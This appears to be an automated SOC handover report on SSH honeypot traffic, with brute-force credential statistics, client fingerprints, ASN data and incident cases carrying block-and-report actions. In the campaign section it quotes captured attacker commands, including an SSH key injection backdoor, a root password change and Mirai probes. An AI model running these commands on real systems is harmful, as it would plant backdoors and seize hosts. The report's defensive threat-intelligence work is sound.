# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-11-03 |
| **Generated At** | 2026-11-03T18:48:52Z |
| **Shift Time** | 18:48 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **348** |
| Confirmed Threats | **279** |
| False Positives Filtered | **69** (19.8%) |
| Unique Attacker IPs | **193** |
| Countries of Origin | **34** |
| High Severity Cases | **170** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **178** |
| Malware Samples Analyzed | **9** HIGH · **25** MED · 0 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **3318** |
| Unique Credential Pairs | **1825** |
| Unique Usernames | **739** |
| Unique Passwords | **1313** |
| Successful Auth Pairs | **2838** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 772 |
| `ubuntu` | 260 |
| `user` | 67 |
| `admin` | 64 |
| `deploy` | 40 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 151 |
| `123` | 65 |
| `1234` | 53 |
| `12345678` | 49 |
| `password` | 36 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 30 |
| `support` | `support` | 26 |
| `root` | `123456` | 13 |
| `ubuntu` | `123456` | 10 |
| `carlos` | `carlos` | 8 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `P@ssw0rd` | `10.0.0.73` | 2026-11-03T03:14:03 |
| `root` | `1qaz@WSX3edc` | `10.0.0.73` | 2026-11-03T03:14:14 |
| `user9` | `user9` | `10.0.0.73` | 2026-11-03T03:14:23 |
| `user10` | `user10` | `10.0.0.73` | 2026-11-03T03:14:33 |
| `user2` | `user2` | `10.0.0.73` | 2026-11-03T03:14:42 |
| `super` | `super` | `10.0.0.73` | 2026-11-03T03:14:52 |
| `user4` | `user4` | `10.0.0.73` | 2026-11-03T03:15:02 |
| `user` | `p@ssw0rd` | `10.0.0.73` | 2026-11-03T03:15:12 |
| `ubuntu` | `123456` | `10.0.0.73` | 2026-11-03T03:15:22 |
| `ubuntu` | `1234567` | `10.0.0.73` | 2026-11-03T03:15:32 |
| `ubuntu` | `12345678` | `10.0.0.73` | 2026-11-03T03:15:42 |
| `ubuntu` | `123456789` | `10.0.0.73` | 2026-11-03T03:15:53 |
| `ubuntu` | `zaq123` | `10.0.0.73` | 2026-11-03T03:16:03 |
| `ubuntu` | `321qaz` | `10.0.0.73` | 2026-11-03T03:16:14 |
| `ubuntu` | `123123` | `10.0.0.73` | 2026-11-03T03:16:24 |
| `ubuntu` | `user123` | `10.0.0.73` | 2026-11-03T03:16:34 |
| `ubuntu` | `ajvps` | `10.0.0.73` | 2026-11-03T03:16:45 |
| `ubuntu` | `123456aA@` | `10.0.0.73` | 2026-11-03T03:16:55 |
| `ubuntu` | `Asdf123456` | `10.0.0.73` | 2026-11-03T03:17:06 |
| `ubuntu` | `Aa123456789!` | `10.0.0.73` | 2026-11-03T03:17:17 |
_… 2818 more successful pair(s) in credentials.json_

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **348** |
| Sessions with Fingerprint | **27** |
| Unique HASSH Fingerprints | **27** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 95 |
| libssh | 80 |
| OpenSSH | 10 |
| Unknown | 4 |
| PuTTY | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 44 | 27 |
| `2ec37a7cc8da...` | Mirai/variant | 43 | 4 |
| `16443846184e...` | Generic scanner | 25 | 10 |
| `a591c4ddccc9...` | Mirai/variant | 9 | 2 |
| `eff4c24daffc...` | Modern SSH client | 8 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 44 | 27 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 43 | 4 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 25 | 10 | Generic scanner |
| `95420f9d932d...` | libssh | 16 | 9 | — |
| `a591c4ddccc9...` | libssh | 9 | 2 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 8 | 1 | Modern SSH client |
| `390ffe68a68c...` | OpenSSH | 8 | 3 | Modern SSH client |
| `03a80b21afa8...` | libssh | 8 | 5 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **60** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 2 | 2 | `T1082, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 21 | 21 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:nnVGGnVbh0Ev"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `46.6.124.199`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
```
```
/bin/busybox TEST
```
```
cat /proc
```
```
./
```
Source IPs: `77.239.124.162`, `89.125.237.102`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `203.145.143.163`, `60.214.154.254`, `204.168.204.232`, `204.168.250.255`, `46.8.224.240`, `23.88.43.131`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **193** |
| Unique ASNs | **83** |
| High-Risk ASNs | **61** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 49 | HIGH |
| `AS396982` | Google LLC | 7 | LOW |
| `AS8075` | Microsoft Corporation | 6 | HIGH |
| `AS398324` | Censys, Inc. | 6 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 5 | HIGH |
| `AS14061` | DigitalOcean, LLC | 5 | HIGH |
| `AS25369` | Hydra Communications Ltd | 4 | HIGH |
| `AS4134` | CHINANET BACKBONE | 4 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (157)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-64033ed9700a

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-11-03 03:33 |
| **Last Seen** | 2026-11-03 03:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-03 03:33:30` | `cowrie.session.connect` |
| `2026-11-03 03:33:30` | `cowrie.client.version` |
| `2026-11-03 03:33:30` | `cowrie.client.kex` |
| `2026-11-03 03:33:30` | `cowrie.login.success` |
| `2026-11-03 03:33:31` | `cowrie.direct-tcpip.request` |
| `2026-11-03 03:33:31` | `cowrie.direct-tcpip.data` |
| `2026-11-03 03:33:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d89c1f37ab4

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]65` |
| **First Seen** | 2026-11-03 03:40 |
| **Last Seen** | 2026-11-03 03:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-03 03:40:41` | `cowrie.session.connect` |
| `2026-11-03 03:40:41` | `cowrie.client.version` |
| `2026-11-03 03:40:41` | `cowrie.client.kex` |
| `2026-11-03 03:40:41` | `cowrie.login.success` |
| `2026-11-03 03:40:41` | `cowrie.direct-tcpip.request` |
| `2026-11-03 03:40:42` | `cowrie.direct-tcpip.data` |
| `2026-11-03 03:40:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]65` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]65` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a81910cd079

| Field | Detail |
|---|---|
| **Source IP** | `35.210.39[.]113` |
| **First Seen** | 2026-11-03 03:46 |
| **Last Seen** | 2026-11-03 03:46 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-03 03:46:16` | `cowrie.session.connect` |
| `2026-11-03 03:46:16` | `cowrie.client.version` |
| `2026-11-03 03:46:16` | `cowrie.client.kex` |
| `2026-11-03 03:46:18` | `cowrie.login.success` |
| `2026-11-03 03:46:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.39[.]113` to AbuseIPDB if not already reported
- [ ] Block `35.210.39[.]113` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b4d1637266f

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-11-03 04:04 |
| **Last Seen** | 2026-11-03 04:04 |
| **Session Duration** | 45s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_f349a4ae3077025f6c21ae03f9e582a3_small_control'"'"' '"'"'check_f349a4ae3077025f6c21ae03f9e582a3'"'"'', printf '\n%s|%s\n' 'check_f349a4ae3077025f6c21ae03f9e582a3_small_control' 'check_f349a4ae3077025f6c21ae03f9e582a3', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_f349a4ae3077025f6c21ae03f9e582a3_small_math'"'"' "$((468*537+8))"', (468*537+8, printf '\n%s|%s\n' 'check_f349a4ae3077025f6c21ae03f9e582a3_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-03 04:04:12` | `cowrie.session.connect` |
| `2026-11-03 04:04:12` | `cowrie.client.version` |
| `2026-11-03 04:04:12` | `cowrie.client.kex` |
| `2026-11-03 04:04:14` | `cowrie.login.success` |
| `2026-11-03 04:04:16` | `cowrie.client.size` |
| `2026-11-03 04:04:17` | `cowrie.session.params` |
| `2026-11-03 04:04:17` | `cowrie.command.input` |
| `2026-11-03 04:04:17` | `cowrie.command.input` |
| `2026-11-03 04:04:17` | `cowrie.command.input` |
| `2026-11-03 04:04:17` | `cowrie.command.input` |
| `2026-11-03 04:04:17` | `cowrie.command.input` |
| `2026-11-03 04:04:17` | `cowrie.command.input` |
| `2026-11-03 04:04:17` | `cowrie.command.input` |
| `2026-11-03 04:04:17` | `cowrie.command.input` |
| `2026-11-03 04:04:17` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7593cd7c45c8

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-11-03 04:05 |
| **Last Seen** | 2026-11-03 04:06 |
| **Session Duration** | 43s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_17af83163c587f60287ba941dfe46f4c_small_control'"'"' '"'"'check_17af83163c587f60287ba941dfe46f4c'"'"'', printf '\n%s|%s\n' 'check_17af83163c587f60287ba941dfe46f4c_small_control' 'check_17af83163c587f60287ba941dfe46f4c', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_17af83163c587f60287ba941dfe46f4c_small_math'"'"' "$((82*856+50))"', (82*856+50, printf '\n%s|%s\n' 'check_17af83163c587f60287ba941dfe46f4c_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-03 04:05:51` | `cowrie.session.connect` |
| `2026-11-03 04:05:51` | `cowrie.client.version` |
| `2026-11-03 04:05:51` | `cowrie.client.kex` |
| `2026-11-03 04:05:54` | `cowrie.login.success` |
| `2026-11-03 04:05:56` | `cowrie.client.size` |
| `2026-11-03 04:05:56` | `cowrie.session.params` |
| `2026-11-03 04:05:57` | `cowrie.command.input` |
| `2026-11-03 04:05:57` | `cowrie.command.input` |
| `2026-11-03 04:05:57` | `cowrie.command.input` |
| `2026-11-03 04:05:57` | `cowrie.command.input` |
| `2026-11-03 04:05:57` | `cowrie.command.input` |
| `2026-11-03 04:05:57` | `cowrie.command.input` |
| `2026-11-03 04:05:57` | `cowrie.command.input` |
| `2026-11-03 04:05:57` | `cowrie.command.input` |
| `2026-11-03 04:05:57` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d742a59befdc

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-11-03 04:07 |
| **Last Seen** | 2026-11-03 04:08 |
| **Session Duration** | 55s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_d3d564e4e8f6fc1618ab2364dc117e82_small_control'"'"' '"'"'check_d3d564e4e8f6fc1618ab2364dc117e82'"'"'', printf '\n%s|%s\n' 'check_d3d564e4e8f6fc1618ab2364dc117e82_small_control' 'check_d3d564e4e8f6fc1618ab2364dc117e82', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_d3d564e4e8f6fc1618ab2364dc117e82_small_math'"'"' "$((392*63+7))"', (392*63+7, printf '\n%s|%s\n' 'check_d3d564e4e8f6fc1618ab2364dc117e82_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-03 04:07:33` | `cowrie.session.connect` |
| `2026-11-03 04:07:34` | `cowrie.client.version` |
| `2026-11-03 04:07:34` | `cowrie.client.kex` |
| `2026-11-03 04:07:35` | `cowrie.login.success` |
| `2026-11-03 04:07:37` | `cowrie.client.size` |
| `2026-11-03 04:07:38` | `cowrie.session.params` |
| `2026-11-03 04:07:38` | `cowrie.command.input` |
| `2026-11-03 04:07:38` | `cowrie.command.input` |
| `2026-11-03 04:07:38` | `cowrie.command.input` |
| `2026-11-03 04:07:38` | `cowrie.command.input` |
| `2026-11-03 04:07:39` | `cowrie.command.input` |
| `2026-11-03 04:07:39` | `cowrie.command.input` |
| `2026-11-03 04:07:39` | `cowrie.command.input` |
| `2026-11-03 04:07:39` | `cowrie.command.input` |
| `2026-11-03 04:07:39` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ddb0d4ac582

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]65` |
| **First Seen** | 2026-11-03 04:08 |
| **Last Seen** | 2026-11-03 04:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-03 04:08:27` | `cowrie.session.connect` |
| `2026-11-03 04:08:27` | `cowrie.client.version` |
| `2026-11-03 04:08:27` | `cowrie.client.kex` |
| `2026-11-03 04:08:28` | `cowrie.login.success` |
| `2026-11-03 04:08:28` | `cowrie.direct-tcpip.request` |
| `2026-11-03 04:08:28` | `cowrie.direct-tcpip.data` |
| `2026-11-03 04:08:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]65` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]65` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e03e5306c577

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-11-03 04:09 |
| **Last Seen** | 2026-11-03 04:10 |
| **Session Duration** | 47s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_5980d1a0f40493e784df1ba94fd6e50e_small_control'"'"' '"'"'check_5980d1a0f40493e784df1ba94fd6e50e'"'"'', printf '\n%s|%s\n' 'check_5980d1a0f40493e784df1ba94fd6e50e_small_control' 'check_5980d1a0f40493e784df1ba94fd6e50e', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_5980d1a0f40493e784df1ba94fd6e50e_small_math'"'"' "$((979*151+21))"', (979*151+21, printf '\n%s|%s\n' 'check_5980d1a0f40493e784df1ba94fd6e50e_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-03 04:09:24` | `cowrie.session.connect` |
| `2026-11-03 04:09:24` | `cowrie.client.version` |
| `2026-11-03 04:09:24` | `cowrie.client.kex` |
| `2026-11-03 04:09:27` | `cowrie.login.success` |
| `2026-11-03 04:09:28` | `cowrie.client.size` |
| `2026-11-03 04:09:29` | `cowrie.session.params` |
| `2026-11-03 04:09:30` | `cowrie.command.input` |
| `2026-11-03 04:09:30` | `cowrie.command.input` |
| `2026-11-03 04:09:30` | `cowrie.command.input` |
| `2026-11-03 04:09:30` | `cowrie.command.input` |
| `2026-11-03 04:09:30` | `cowrie.command.input` |
| `2026-11-03 04:09:30` | `cowrie.command.input` |
| `2026-11-03 04:09:30` | `cowrie.command.input` |
| `2026-11-03 04:09:30` | `cowrie.command.input` |
| `2026-11-03 04:09:30` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a674c68bb4b5

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-11-03 04:11 |
| **Last Seen** | 2026-11-03 04:12 |
| **Session Duration** | 56s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_99400dd86163fd7fb9fd12352fa2a2a4_small_control'"'"' '"'"'check_99400dd86163fd7fb9fd12352fa2a2a4'"'"'', printf '\n%s|%s\n' 'check_99400dd86163fd7fb9fd12352fa2a2a4_small_control' 'check_99400dd86163fd7fb9fd12352fa2a2a4', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_99400dd86163fd7fb9fd12352fa2a2a4_small_math'"'"' "$((350*572+45))"', (350*572+45, printf '\n%s|%s\n' 'check_99400dd86163fd7fb9fd12352fa2a2a4_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-03 04:11:18` | `cowrie.session.connect` |
| `2026-11-03 04:11:19` | `cowrie.client.version` |
| `2026-11-03 04:11:19` | `cowrie.client.kex` |
| `2026-11-03 04:11:21` | `cowrie.login.success` |
| `2026-11-03 04:11:23` | `cowrie.client.size` |
| `2026-11-03 04:11:24` | `cowrie.session.params` |
| `2026-11-03 04:11:25` | `cowrie.command.input` |
| `2026-11-03 04:11:25` | `cowrie.command.input` |
| `2026-11-03 04:11:25` | `cowrie.command.input` |
| `2026-11-03 04:11:25` | `cowrie.command.input` |
| `2026-11-03 04:11:25` | `cowrie.command.input` |
| `2026-11-03 04:11:25` | `cowrie.command.input` |
| `2026-11-03 04:11:25` | `cowrie.command.input` |
| `2026-11-03 04:11:25` | `cowrie.command.input` |
| `2026-11-03 04:11:25` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2e60c8da662

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-11-03 04:13 |
| **Last Seen** | 2026-11-03 04:14 |
| **Session Duration** | 48s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_c75f16c3d7c618c45546bef10d881154_small_control'"'"' '"'"'check_c75f16c3d7c618c45546bef10d881154'"'"'', printf '\n%s|%s\n' 'check_c75f16c3d7c618c45546bef10d881154_small_control' 'check_c75f16c3d7c618c45546bef10d881154', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_c75f16c3d7c618c45546bef10d881154_small_math'"'"' "$((193*873+18))"', (193*873+18, printf '\n%s|%s\n' 'check_c75f16c3d7c618c45546bef10d881154_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-03 04:13:16` | `cowrie.session.connect` |
| `2026-11-03 04:13:17` | `cowrie.client.version` |
| `2026-11-03 04:13:17` | `cowrie.client.kex` |
| `2026-11-03 04:13:19` | `cowrie.login.success` |
| `2026-11-03 04:13:21` | `cowrie.client.size` |
| `2026-11-03 04:13:22` | `cowrie.session.params` |
| `2026-11-03 04:13:23` | `cowrie.command.input` |
| `2026-11-03 04:13:23` | `cowrie.command.input` |
| `2026-11-03 04:13:23` | `cowrie.command.input` |
| `2026-11-03 04:13:23` | `cowrie.command.input` |
| `2026-11-03 04:13:23` | `cowrie.command.input` |
| `2026-11-03 04:13:23` | `cowrie.command.input` |
| `2026-11-03 04:13:23` | `cowrie.command.input` |
| `2026-11-03 04:13:23` | `cowrie.command.input` |
| `2026-11-03 04:13:23` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6deea34d1dc

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-11-03 04:17 |
| **Last Seen** | 2026-11-03 04:17 |
| **Session Duration** | 52s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_b5bd710a0916f85c04e18820333fa3d1_small_control'"'"' '"'"'check_b5bd710a0916f85c04e18820333fa3d1'"'"'', printf '\n%s|%s\n' 'check_b5bd710a0916f85c04e18820333fa3d1_small_control' 'check_b5bd710a0916f85c04e18820333fa3d1', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_b5bd710a0916f85c04e18820333fa3d1_small_math'"'"' "$((664*200+63))"', (664*200+63, printf '\n%s|%s\n' 'check_b5bd710a0916f85c04e18820333fa3d1_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-03 04:17:01` | `cowrie.session.connect` |
| `2026-11-03 04:17:02` | `cowrie.client.version` |
| `2026-11-03 04:17:02` | `cowrie.client.kex` |
| `2026-11-03 04:17:04` | `cowrie.login.success` |
| `2026-11-03 04:17:06` | `cowrie.client.size` |
| `2026-11-03 04:17:06` | `cowrie.session.params` |
| `2026-11-03 04:17:07` | `cowrie.command.input` |
| `2026-11-03 04:17:07` | `cowrie.command.input` |
| `2026-11-03 04:17:07` | `cowrie.command.input` |
| `2026-11-03 04:17:07` | `cowrie.command.input` |
| `2026-11-03 04:17:07` | `cowrie.command.input` |
| `2026-11-03 04:17:07` | `cowrie.command.input` |
| `2026-11-03 04:17:07` | `cowrie.command.input` |
| `2026-11-03 04:17:07` | `cowrie.command.input` |
| `2026-11-03 04:17:07` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e625b044f08

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-11-03 04:18 |
| **Last Seen** | 2026-11-03 04:19 |
| **Session Duration** | 67s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
